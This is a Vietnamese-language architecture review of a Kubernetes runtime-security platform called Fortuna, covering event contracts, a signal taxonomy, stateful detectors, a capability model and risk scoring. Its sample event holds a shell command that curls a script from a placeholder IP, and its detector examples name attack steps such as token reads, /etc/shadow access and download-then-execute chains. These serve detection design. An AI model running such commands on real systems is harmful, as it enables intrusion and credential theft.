Kết luận ngắn trước
Hiện trạng Fortuna đang ở đâu?

Fortuna hiện tại đang có:

nguồn dữ liệu đúng
pipeline ingest đúng
đã có REP / capability / risk / score
đã có hướng explainable findings

Nhưng vẫn còn ở mức:

“event → signal → rule → finding”

Trong khi target đúng phải là:

“event → normalized fact → correlated signal → effective capability → risk condition → explainable insight → prioritized score”

Nếu không formalize theo mô hình này, về sau hệ thống sẽ bị:

rule loạn
capability chồng chéo
score khó giải thích
runtime noise cao
khó mở rộng MITRE / attack path / blast radius

Nói gọn kiểu dân kỹ thuật:

Bạn đã có động cơ, nhưng chưa có hộp số.

1) Đánh giá tổng hợp toàn bộ kiến trúc runtime/risk hiện tại

Tôi sẽ đánh giá theo 5 trục:

Collection & Event Contract
Normalization & Runtime Semantics
Correlation & Detection
Capability & Risk Reasoning
Scoring, Explainability, UI/Workflow
2) Đánh giá theo từng lớp
2.1. Collection / Sensors — hướng đúng, nhưng phải “khóa contract”

Flow bạn đưa:
flowchart TD
  subgraph Sensors["Sensors / Collectors"]
    F["Falco (optional)"] -->|JSONL| AF["Adapter → RuntimeEventDTO"]
    E["eBPF/LSM Collector"] --> AE["Adapter → RuntimeEventDTO"]
    T["Tetragon/Tracee (optional)"] --> AT["Adapter → RuntimeEventDTO"]
  end
Đánh giá:

Đây là thiết kế đúng chuẩn.

Điểm mạnh:
Không bind risk engine vào Falco-only
Cho phép multi-source runtime coverage
Cho phép cross-validation giữa sensors
Giảm vendor lock-in / detector lock-in
Nhưng:

Nếu RuntimeEventDTO không đủ mạnh, toàn bộ phía sau sẽ rác đẹp.

“Garbage in, garbage everywhere.”

Kết luận lớp này:
P0 bắt buộc: RuntimeEventDTO phải là canonical contract thật sự

Không được để mỗi adapter map “tùy hứng”.

2.2. Agent ingest layer — đang hợp lý, nhưng phải xem nó như “delivery system”, không phải “semantic layer”

Flow:
flowchart TD
  subgraph Agent2["Agent"]
    AF --> ING
    AE --> ING
    AT --> ING
    ING["Runtime ingest client\n(retry, backpressure, batching)"] -->|POST runtime/events| CoreIn
  end
Đánh giá:

Rất ổn về mặt operational robustness:

retry
batching
backpressure

Đúng bài.

Nhưng cần tránh:
Đừng nhét logic “security meaning” vào Agent quá nhiều.

Agent nên:

adapt
enrich nhẹ
buffer
deliver

Không nên:

correlate nặng
score
capability reasoning sâu
deduce final signals quá nhiều
Vì sao?

Vì:

khó versioning
khó rule rollout
khó reprocess
khó audit
khó deterministic testing
Khuyến nghị:
Agent chỉ nên làm light enrichment, ví dụ:
resolve pod metadata cache
normalize process fields
attach source info
minimal parent lineage nếu lấy được

Còn:

signal synthesis
correlation
capability init/promotion
risk evaluation

=> nên để Core xử lý.

2.3. Core ingest — đúng hướng, nhưng mới chỉ là “landing zone”

Flow:
flowchart TD
  subgraph Core2["Core"]
    CoreIn["Runtime ingest\nvalidate contract\npersist runtime_events"] --> DB[(DB)]
  end
Đánh giá:

Cách này đúng. Core ingest nên là:

schema validation
source validation
dedupe guard (nếu có)
integrity checks
persistence
Nhưng:

Hiện tại nếu runtime_events vừa là:

audit store
source of truth
detection input
UI display source

… thì sẽ sớm lộn xộn.

Cần phân lớp dữ liệu rõ:
Runtime data nên có ít nhất 4 tầng:
Tầng 1 — Raw Runtime Events

Immutable ingestion log.

Ví dụ table:

runtime_events

Chứa:

source
timestamp
normalized DTO
raw payload hash
pod_uid
host/node
process/file/net fields
ingestion metadata
Mục tiêu:
forensic replay
reprocessing
auditability
Tầng 2 — Behavior Facts

Từ raw event rút ra fact chuẩn hóa.

Ví dụ:

runtime_behavior_facts

Ví dụ facts:

PROCESS_EXEC
FILE_READ
FILE_WRITE
NETWORK_CONNECT
PRIV_ESC_ATTEMPT
SERVICEACCOUNT_TOKEN_READ
Mục tiêu:
tách raw event khỏi semantic meaning
detector dễ dùng hơn
source-independent reasoning
Tầng 3 — Runtime Signals

Signal mang tính security semantics.

Ví dụ:

runtime_signals

Ví dụ:

SUSPICIOUS_SHELL_EXEC
SENSITIVE_FILE_ACCESS
EXTERNAL_EGRESS
CONTAINER_ESCAPE_PRIMITIVE
CREDENTIAL_ACCESS
Mục tiêu:
input cho risk engine
input cho UI
input cho capability promotion
Tầng 4 — Runtime Incidents / Episodes

Stateful correlated behaviors.

Ví dụ:

runtime_incidents

Ví dụ:

POST_EXPLOIT_EXEC_CHAIN
PORT_SCAN_LIKE_ACTIVITY
EXFIL_LIKE_SEQUENCE
REPEATED_CREDENTIAL_TOUCH
Mục tiêu:
giảm noise
tăng confidence
phản ánh hành vi thực sự
3) Kiến trúc chung đề xuất — mô hình chuẩn cho Fortuna

Đây là kiến trúc mà tôi khuyên bạn “đóng khung” làm target-state.

3.1. Kiến trúc tổng thể chuẩn hóa
flowchart TD
  subgraph Sensors["Sensors / Collectors"]
    F["Falco (optional)"] --> AF["Adapter"]
    E["eBPF / LSM Collector"] --> AE["Adapter"]
    T["Tetragon / Tracee (optional)"] --> AT["Adapter"]
  end

  subgraph Agent["Fortuna Agent"]
    AF --> DTO["RuntimeEventDTO\nCanonical Contract"]
    AE --> DTO
    AT --> DTO
    DTO --> ING["Runtime Ingest Client\nretry / batching / backpressure"]
  end

  subgraph Core["Fortuna Core"]
    ING --> RI["Runtime Ingest API\nvalidate / auth / persist"]

    RI --> RE[(runtime_events)]
    RE --> BF["Behavior Fact Extractor"]
    BF --> RBF[(runtime_behavior_facts)]

    RBF --> REP["REP v2\nNormalizer + Correlator\nwindowed detectors"]
    REP --> RS[(runtime_signals)]
    REP --> RINC[(runtime_incidents)]

    RS --> CAP["Capability Engine\ninit + promote + suppress"]
    RINC --> CAP
    CAP --> EC[(effective_capabilities)]

    EC --> RISK["Risk Engine\nCEL + toxic combinations + graph predicates"]
    RS --> RISK
    RINC --> RISK
    RISK --> INS["Insight Manager\nstateful + explainable"]
    INS --> INSDB[(insights)]

    INSDB --> SCORE["Scorer v3\nfactorized scoring + confidence + decay"]
    SCORE --> SCOREDB[(risk_scores)]
  end

  subgraph State["Unified Security State"]
    INV[(inventory / assets / relationships)]
    SBOM[(sbom / packages / vulns)]
    EC
    RS
    RINC
    INSDB
    SCOREDB
  end

  subgraph UI["Dashboard / API"]
    INSDB --> POD["PodDetail\nEvents / Signals / Capabilities / Insights"]
    SCOREDB --> RISKUI["Risk Overview / Priority"]
    RS --> COV["Coverage View\nMITRE x Signals x Sources"]
    RINC --> LIVE["Live Runtime Activity / Timeline"]
  end
4) Mô hình dữ liệu đầy đủ — đây là phần quan trọng nhất

Nếu không khóa model, code sẽ trôi theo feature request.

4.1. Canonical Runtime Event Model (RuntimeEventDTO)

Đây là contract gốc, phải chuẩn.

Mục tiêu:

Mọi source:

Falco
eBPF
Tetragon
Tracee

… đều phải adapt về cùng một shape.

4.1.1. DTO đề xuất
{
  "event_id": "uuid",
  "observed_at": "2026-03-26T10:01:02Z",
  "source": {
    "kind": "falco|ebpf|tetragon|tracee",
    "sensor_id": "node-agent-01",
    "raw_rule": "Terminal shell in container",
    "raw_category": "process"
  },
  "k8s": {
    "cluster_id": "prod-cluster",
    "node_name": "worker-01",
    "namespace": "payments",
    "pod_name": "api-5f7f6",
    "pod_uid": "pod-uid-required",
    "container_id": "containerd://...",
    "container_name": "app",
    "image": "registry/app:1.2.3",
    "service_account": "payments-sa",
    "labels": {
      "app": "payments-api",
      "env": "prod"
    }
  },
  "process": {
    "pid": 1234,
    "ppid": 567,
    "exe": "/bin/sh",
    "cmdline": "/bin/sh -c curl http://x.x.x.x/a.sh",
    "argv": ["/bin/sh", "-c", "curl http://x.x.x.x/a.sh"],
    "cwd": "/tmp",
    "uid": 0,
    "gid": 0,
    "tty": false,
    "ancestry": [
      {"exe": "/usr/bin/bash", "pid": 567},
      {"exe": "/app/server", "pid": 120}
    ]
  },
  "file": {
    "path": "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "operation": "read",
    "target_type": "file"
  },
  "network": {
    "direction": "egress",
    "protocol": "tcp",
    "src_ip": "10.1.2.3",
    "src_port": 39012,
    "dst_ip": "8.8.8.8",
    "dst_port": 53,
    "dns_query": "example.com"
  },
  "security": {
    "syscall": "openat",
    "privilege_indicator": true,
    "kernel_indicator": false,
    "confidence": "medium"
  },
  "raw": {
    "payload_hash": "sha256:...",
    "truncated": false
  }
}
4.1.2. Contract rules bắt buộc
Bắt buộc:
event_id
observed_at
source.kind
k8s.pod_uid (nếu resolve được)
ít nhất 1 trong:
process
file
network
security
Nếu pod_uid không resolve được:

Không drop ngay, mà nên:

mark resolution_state = unresolved
retry enrichment async nếu cần
Vì sao?

Vì runtime data ngoài đời không phải lúc nào cũng sạch.

Nếu cứng quá thì mất signal.
Nếu lỏng quá thì thành bãi rác.

Cần ở giữa.

5) REP v2 — đây mới là “trái tim” runtime security

Bạn gọi là:

REP v2 Normalize + Correlate (windowed detectors)

Tôi đồng ý, nhưng cần định nghĩa rõ nó là gì.

5.1. REP v2 không chỉ là “adapter đẹp hơn”

REP v2 phải là:

Runtime Evidence Processing Engine

Nó nên có 3 chức năng chính:

REP-A: Normalization

Chuyển runtime_events → runtime_behavior_facts

Ví dụ:

Raw Event	Behavior Fact
Falco “Terminal shell in container”	PROCESS_EXEC + INTERACTIVE_SHELL
eBPF openat /var/run/.../token	FILE_READ + SERVICEACCOUNT_TOKEN_READ
Tracee outbound connect	NETWORK_CONNECT + EXTERNAL_EGRESS
REP-B: Signal Synthesis

Chuyển facts → runtime_signals

Ví dụ:

Facts	Signal
INTERACTIVE_SHELL	SUSPICIOUS_SHELL_EXEC
SERVICEACCOUNT_TOKEN_READ	CREDENTIAL_ACCESS
FILE_READ /etc/shadow	SENSITIVE_FILE_ACCESS
NETWORK_CONNECT to public IP	EXTERNAL_EGRESS
REP-C: Correlation / Stateful Detection

Chuyển facts/signals → runtime_incidents

Ví dụ:

Sequence	Incident
shell → curl → chmod +x → exec /tmp	POST_EXPLOIT_EXEC_CHAIN
many ports same dst	PORT_SCAN_LIKE_ACTIVITY
repeated token/secret access	CREDENTIAL_COLLECTION_PATTERN
dns burst + connect burst	RECON_ACTIVITY_PATTERN
5.2. Runtime taxonomy — bạn nói đúng: đây là GAP lớn nhất
GAP-1:

Runtime taxonomy còn mỏng → nhiều UNKNOWN

Đây là vấn đề cực nghiêm trọng.

Nếu taxonomy yếu, bạn sẽ bị:

detection “có nhưng vô nghĩa”
capability map không ra
UI xấu
coverage giả
rule CEL viết như bói bài tarot
5.3. Taxonomy đề xuất cho runtime_signals

Tối thiểu phải có 6 nhóm bạn đã nêu, nhưng tôi khuyên nên formalize thành 8 domains.

Domain 1 — Execution
PROCESS_EXEC
INTERACTIVE_SHELL
SUSPICIOUS_BINARY_EXEC
TMP_BINARY_EXEC
INTERPRETER_EXEC
REMOTE_TOOL_EXEC
Domain 2 — Filesystem
SENSITIVE_FILE_READ
SENSITIVE_FILE_WRITE
SERVICEACCOUNT_TOKEN_READ
HOST_PATH_ACCESS
BINARY_DROP
LOG_TAMPERING
Domain 3 — Network
EXTERNAL_EGRESS
DNS_ANOMALY
PORT_SCAN_LIKE
C2_LIKE_CONNECTION
LATERAL_CONNECT_ATTEMPT
INTERNAL_RECON_TRAFFIC
Domain 4 — Privilege / Escape
PRIV_ESC_ATTEMPT
CAPABILITY_ABUSE
NAMESPACE_ESCAPE_PRIMITIVE
HOST_NAMESPACE_TOUCH
CONTAINER_ESCAPE_PRIMITIVE
Domain 5 — Credential / Secret Access
CREDENTIAL_ACCESS
SECRET_MATERIAL_READ
K8S_API_TOKEN_USE
SSH_KEY_TOUCH
CLOUD_METADATA_ACCESS
Domain 6 — Defense Evasion
SECURITY_TOOL_TAMPERING
PROC_HIDE_ATTEMPT
HISTORY_CLEARING
AUDIT_EVASION
ARTIFACT_CLEANUP
Domain 7 — Discovery / Recon
ENV_DISCOVERY
K8S_RECON
PROCESS_ENUMERATION
FILE_SYSTEM_ENUMERATION
NETWORK_RECON
Domain 8 — Persistence / Staging
CRON_MODIFICATION
STARTUP_SCRIPT_TAMPERING
BINARY_STAGING
REMOTE_PAYLOAD_FETCH
PERSISTENCE_ATTEMPT
Khuyến nghị:

Mỗi signal type phải có metadata chuẩn:

{
  "signal_type": "SERVICEACCOUNT_TOKEN_READ",
  "domain": "credentials",
  "severity_hint": "high",
  "confidence_hint": "medium",
  "mitre_tactic": "Credential Access",
  "mitre_techniques": ["T1552"],
  "promotable_capabilities": ["K8S_API_ACCESS"],
  "default_decay": "24h"
}
6) Correlation / Stateful Detectors — nếu thiếu cái này thì runtime chỉ là “log có make-up”
GAP-2:

Thiếu correlation/stateful detectors

Đúng hoàn toàn.

6.1. Kiến trúc detector nên có 2 loại
A. Stateless Detector

1 event / 1 fact / 1 signal

Ví dụ:

/bin/sh exec
token file read
outbound TCP 4444

Nhanh, dễ, nhiều coverage.

B. Stateful Detector

nhiều events trong time window → signal/incident

Ví dụ:

10 DNS queries / 30s + 20 connect attempts
shell spawn → download → chmod → exec
repeated file reads into sensitive paths
Đây là thứ tạo “semantic meaning”.
6.2. Detector model đề xuất

Mỗi detector nên có:

detector_id
input_facts
window
group_by
condition
output_signal hoặc output_incident
confidence_rule
suppression_rule

Ví dụ:

id: post_exploit_exec_chain
window: 5m
group_by: [pod_uid, container_id]
requires:
  - INTERACTIVE_SHELL
  - REMOTE_PAYLOAD_FETCH
  - TMP_BINARY_EXEC
emit_incident: POST_EXPLOIT_EXEC_CHAIN
confidence: high
7) Capability model — đây là phần phải làm cực kỳ rõ
GAP-3:

Capability promotion phụ thuộc capability row đã tồn tại

Đúng. Và nếu không sửa, nó sẽ là lỗi kiến trúc chứ không chỉ là bug pipeline.

7.1. Capability không nên là “bảng phụ”

Capability phải là trung tâm của runtime-aware risk.

Vì risk thật sự không phải:

“đã có event gì”

Mà là:

“thực thể này bây giờ có thể làm gì”
7.2. Capability model đúng nên có 3 lớp
7.2.1. Declared / Static Capability

Suy ra từ cấu hình / inventory:

Ví dụ:

hostPath mount
privileged
root
SA permissions
host network
NET_ADMIN

Ví dụ output:

CAN_ACCESS_HOST_FS
CAN_REACH_K8S_API
CAN_MODIFY_NETWORK
CAN_READ_SECRETS
7.2.2. Observed Capability

Suy ra từ runtime evidence:

Ví dụ:

token file read
outbound connect
shell exec
host file touch

Ví dụ output:

OBSERVED_K8S_API_ACCESS
OBSERVED_EXTERNAL_EGRESS
OBSERVED_PROCESS_EXECUTION
OBSERVED_HOST_FILE_TOUCH
7.2.3. Effective Capability

Hợp nhất của static + observed + inferred reasoning.

Ví dụ:

pod có token mount + runtime token read + API egress
→ EFFECTIVE_K8S_CONTROL_PLANE_ACCESS
Đây là lớp RiskEngine phải đọc.
7.3. Capability init phải là runtime-first + idempotent

Khi runtime signal đến trước:

nếu capability chưa có → create
nếu có rồi → update/promote
nếu suppressed → giữ suppression state
Quy tắc:

Capability engine phải:

không phụ thuộc thứ tự event
idempotent
replay-safe
incremental

Nếu không, chỉ cần out-of-order event là bạn toang.

8) Enrichment — bạn nói đúng: đây là chỗ hiện tại còn “mỏng thịt”
GAP-4:

Enrichment thiếu chiều sâu

Đúng.

Hiện tại nếu evidence chủ yếu là:

syscall
target string

… thì insight sẽ rất “có vẻ nghiêm trọng nhưng lại thiếu hồn”.

8.1. Enrichment nên có 5 chiều
8.1.1. Process Context
parent chain
interpreter lineage
entrypoint vs spawned process
interactive vs non-interactive

Ví dụ:

/bin/sh do app spawn ≠ /bin/sh do user exec vào pod
8.1.2. File Semantics

Không chỉ path, mà phải hiểu file là gì:

secret material?
credential?
host-sensitive?
executable staging?
log/audit artifact?

Ví dụ:

/etc/passwd ≠ /etc/shadow
/var/run/secrets/.../token rất khác /tmp/a.txt
8.1.3. Network Context
public vs private
internal cluster vs external
known service vs unknown
DNS-backed vs raw IP
burst / fanout pattern
8.1.4. K8s Context
namespace sensitivity
prod/dev
owner/team
workload role
service account privilege
exposed service mapping
8.1.5. Security Context
runAsRoot
privileged
capabilities
host namespaces
writable hostPath
admission baseline deviations
9) Risk Engine — cách đúng để dùng CEL mà không biến nó thành đống spaghetti
Hiện tại:
runtime + static → CEL rules → insights

Hướng này đúng, nhưng phải đóng scope CEL.

9.1. CEL nên dùng cho cái gì?
CEL phù hợp cho:
deterministic predicates
policy conditions
risk condition logic
threshold logic
explainable rule matching

Ví dụ:

internet_exposed &&
effective_capabilities.contains("K8S_API_ACCESS") &&
runtime_signals.contains("CREDENTIAL_ACCESS")

Rất hợp.

9.2. CEL không nên gánh:
event correlation
temporal chaining
scoring math phức tạp
graph traversal nhiều hop
probabilistic confidence

Những thứ đó phải làm trước CEL.

9.3. Kiến trúc Risk Engine đúng nên là:
state projection + capabilities + incidents + static context
→ risk conditions
→ insights

Không phải:

raw events + 7 bảng join + niềm tin
→ CEL
10) Insight model — đây là thứ user sẽ “sờ” nhiều nhất

Nếu insight model kém, cả engine nhìn sẽ rẻ tiền.

10.1. Insight không phải “alert”

Insight nên là:

một kết luận an ninh có trạng thái, lý do, evidence, và khả năng triage

10.2. Insight schema đề xuất
{
  "insight_id": "uuid",
  "asset_id": "pod:payments/api-123",
  "insight_type": "RUNTIME_CREDENTIAL_ACCESS_ON_EXPOSED_WORKLOAD",
  "severity": "high",
  "confidence": "high",
  "status": "open",
  "opened_at": "2026-03-26T10:04:00Z",
  "last_seen_at": "2026-03-26T10:07:12Z",
  "rule_id": "runtime_cred_access_exposed",
  "summary": "Service account token was accessed by a runtime process in an exposed workload.",
  "why_risky": [
    "Workload is externally reachable",
    "Service account token file was read",
    "Observed external egress shortly after token access"
  ],
  "evidence_refs": [
    "event:abc",
    "signal:def",
    "incident:ghi"
  ],
  "capability_refs": [
    "EFFECTIVE_K8S_API_ACCESS"
  ],
  "score_factors": {
    "runtime_threat": 85,
    "blast_radius": 70,
    "confidence": 90
  }
}
11) Scoring — nếu muốn usable thì phải factorized
Hiện tại:

risk_scores + priority

Đúng, nhưng còn quá abstract.

11.1. Score nên tách thành 6 factor tối thiểu
A. Exposure

Workload có lộ ra ngoài không?

B. Exploitability

Có primitive / vuln / path để bị khai thác không?

C. Privilege

Khi bị compromise thì quyền lớn cỡ nào?

D. Runtime Threat

Có hành vi đáng ngờ đang diễn ra không?

E. Blast Radius

Nếu pivot thì lan được đến đâu?

F. Confidence

Mức chắc chắn của kết luận là bao nhiêu?

11.2. Score model đề xuất
overall_risk = weighted(
  exposure,
  exploitability,
  privilege,
  runtime_threat,
  blast_radius,
  confidence
)
Và nên có boost logic:

Ví dụ:

credential_access + external_egress → boost mạnh
host access + root + exec chain → boost rất mạnh
Và decay:
signal runtime cũ phải giảm dần
incident không tái diễn phải tự nguội
12) Unified Security State — đây là xương sống mà Fortuna đang cần

Tôi khuyên bạn chính thức hóa một lớp gọi là:

Unified Security State

Hoặc:

Asset Security State Projection
12.1. Đây là input “duy nhất” cho Risk / UI / Explainability

Mỗi asset (pod/workload) nên có snapshot như sau:

{
  "asset_id": "pod:payments/api-123",
  "identity": {
    "namespace": "payments",
    "service_account": "payments-sa",
    "owner": "payments-team",
    "environment": "prod"
  },
  "exposure": {
    "internet_exposed": true,
    "service_type": "LoadBalancer"
  },
  "privilege": {
    "run_as_root": true,
    "privileged": false,
    "host_path_mount": true
  },
  "software": {
    "critical_vulns": 2,
    "known_exploitable_vulns": 1
  },
  "runtime": {
    "recent_signals": [
      "SERVICEACCOUNT_TOKEN_READ",
      "EXTERNAL_EGRESS"
    ],
    "recent_incidents": [
      "POST_EXPLOIT_EXEC_CHAIN"
    ]
  },
  "capabilities": {
    "declared": ["CAN_REACH_K8S_API"],
    "observed": ["OBSERVED_K8S_API_ACCESS"],
    "effective": ["EFFECTIVE_K8S_CONTROL_PLANE_ACCESS"]
  },
  "blast_radius": {
    "can_read_secrets": true,
    "can_spawn_pods": false
  },
  "risk": {
    "overall_score": 88,
    "priority": "critical"
  }
}
13) Flow dữ liệu đầy đủ — end-to-end model

Đây là flow mà tôi khuyên bạn dùng làm kiến trúc chuẩn chính thức.
flowchart TD
  subgraph Sensors["Sensors / Collectors"]
    F["Falco"] --> AF["Falco Adapter"]
    E["eBPF/LSM"] --> AE["eBPF Adapter"]
    T["Tetragon/Tracee"] --> AT["Runtime Adapter"]
  end

  subgraph Agent["Fortuna Agent"]
    AF --> DTO["Canonical RuntimeEventDTO"]
    AE --> DTO
    AT --> DTO
    DTO --> ING["Ingest Client\nretry / batch / backpressure"]
  end

  subgraph Core["Fortuna Core"]
    ING --> API["Runtime Ingest API\nvalidate / persist"]
    API --> RE[(runtime_events)]

    RE --> BF["Behavior Fact Extractor"]
    BF --> RBF[(runtime_behavior_facts)]

    RBF --> REP["REP v2\nNormalization + Signal Synthesis + Correlation"]
    REP --> RS[(runtime_signals)]
    REP --> RINC[(runtime_incidents)]

    RS --> CAP["Capability Engine\ninit / promote / suppress / decay"]
    RINC --> CAP
    CAP --> CAPDB[(effective_capabilities)]

    CAPDB --> STATE["Security State Projector"]
    RS --> STATE
    RINC --> STATE
    STATE --> ASS[(asset_security_state)]

    ASS --> RISK["Risk Engine\nCEL + risk conditions + toxic combos"]
    RISK --> INS["Insight Manager\nstateful explainable findings"]
    INS --> INSDB[(insights)]

    INSDB --> SCORE["Scorer v3\nfactorized score + priority + confidence"]
    SCORE --> SCOREDB[(risk_scores)]
  end

  subgraph OtherState["Other Security State"]
    INV[(inventory / assets / RBAC / exposure)]
    SBOM[(SBOM / packages / vulns)]
    INV --> ASS
    SBOM --> ASS
  end

  subgraph UI["Dashboard / API"]
    RE --> POD1["Pod Runtime Events"]
    RS --> POD2["Pod Runtime Signals"]
    CAPDB --> POD3["Pod Capabilities"]
    INSDB --> POD4["Pod Insights"]
    SCOREDB --> RISKUI["Risk Overview"]
    RS --> COV["Coverage View\nMITRE x source x signal"]
    RINC --> LIVE["Live Runtime Timeline"]
  end
  14) Đề xuất điều chỉnh theo mức ưu tiên

Bây giờ đến phần thực dụng nhất: nên làm gì trước.

P0 — bắt buộc làm ngay
P0.1. Khóa RuntimeEventDTO

Không có cái này thì tất cả phía sau là cát.

P0.2. Tách 4 tầng runtime data:
runtime_events
runtime_behavior_facts
runtime_signals
runtime_incidents

Đây là bước nâng cấp lớn nhất.

P0.3. Runtime-first capability init

Bỏ phụ thuộc “capability row đã tồn tại”.

P0.4. Formalize runtime taxonomy

Chốt enum / metadata / MITRE / severity / promotable capabilities.

P0.5. Tạo asset_security_state

Đây là backbone cho risk, score, UI, explainability.

P1 — cần làm sớm để hệ thống “ra dáng”
P1.1. REP v2 stateful detectors

Ít nhất cho:

exec chain
credential access chain
recon pattern
exfil-like pattern
P1.2. Insight lifecycle + suppression model

Nếu không, UI sẽ rất nhanh thành chợ.

P1.3. Scorer factorized + confidence + decay

Không chỉ một con số chung chung.

P1.4. Explainability builder

Insight phải trả lời được:

vì sao bị flag
evidence là gì
signal nào contribute
score tăng vì đâu
P2 — làm để platform “đáng tiền”
P2.1. Coverage model

Bạn đã nhắc đúng: Runtime coverage theo category cần hệ thống hóa.

Nên có:
source → signal coverage
MITRE tactic → signal coverage
runtime domain → detector coverage
test coverage → scenario coverage
P2.2. Attack-path / graph substrate

Bắt đầu bằng relational graph cũng được, chưa cần graph DB ngay.

P2.3. Ownership / environment / crown jewel context

Không có business context thì risk chỉ là “nguy hiểm lý thuyết”.

15) Kết luận thật lòng
Nếu chỉ vá GAP riêng lẻ:

Fortuna sẽ thành một hệ thống “có nhiều tính năng runtime”, nhưng không có model trung tâm.

Nếu bạn khóa lại theo kiến trúc tôi đề xuất:

Fortuna sẽ chuyển từ:

Runtime Event Processor

thành:

Runtime-Aware Security State & Risk Platform

Và đó mới là thứ có giá trị thật.

16) Khuyến nghị tiếp theo — nên làm ngay dưới dạng design docs

Tôi khuyên bạn chốt tiếp thành 4 tài liệu thiết kế chính thức để dev bám đúng:

1. FORTUNA_RUNTIME_EVENT_MODEL.md
Canonical RuntimeEventDTO
schema rules
source adapters
validation / contract guarantees
2. FORTUNA_RUNTIME_SIGNAL_MODEL.md
behavior facts
runtime taxonomy
signal metadata
MITRE mapping
detector contracts
3. FORTUNA_CAPABILITY_MODEL.md
declared / observed / effective capability
promotion rules
init / decay / suppression logic
4. FORTUNA_RUNTIME_RISK_ENGINE_ARCHITECTURE.md
full runtime → risk pipeline
asset_security_state
insight model
scorer model
explainability flow